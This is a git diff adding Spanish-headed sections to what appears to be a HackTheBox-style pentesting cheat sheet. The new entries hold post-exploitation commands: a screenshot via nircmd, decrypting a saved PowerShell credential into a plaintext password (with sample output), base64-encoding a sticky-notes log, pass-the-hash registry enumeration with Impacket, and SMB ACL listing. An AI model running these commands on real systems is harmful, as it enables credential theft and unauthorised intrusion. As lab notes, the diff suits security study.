@@ -163,3 +163,52 @@ if __name__ == '__main__':
 update-alternatives --config java
 ```
 
+## Captura de pantalla Windows
+
+```null
+PS C:\Windows\System32\spool\drivers\color> .\nircmd.exe savescreenshot captura.png
+```
+
+## Convertir SecureString a texto plano
+
+```null
+C:\Users\nico\Desktop>powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.getNetworkCredential() | Format-List *"
+powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.getNetworkCredential() | Format-List *"
+
+
+UserName       : Tom
+Password       : 1ts-mag1c!!!
+SecurePassword : System.Security.SecureString
+Domain         : HTB
+```
+
+## Conversión archivo a base64 Windows
+
+```null
+PS C:\Users\k.svensson\AppData\Roaming\stickynotes\Local Storage\leveldb> [convert]::ToBase64String((Get-Content -path "000003.log" -Encoding byte))
+```
+
+## Enumeración de registros
+
+```null
+reg.py htb.local/henry.vinson@APT -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKU
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[!] Cannot check RemoteRegistry status. Hoping it is started...
+HKU
+HKU\Console
+HKU\Control Panel
+HKU\Environment
+HKU\Keyboard Layout
+HKU\Network
+HKU\Software
+HKU\System
+HKU\Volatile Environment
+```
+
+## Listar ACLs a través de montura CIFS
+
+```null
+smbcacls "//10.10.10.103/Department Shares" Users
+```
+
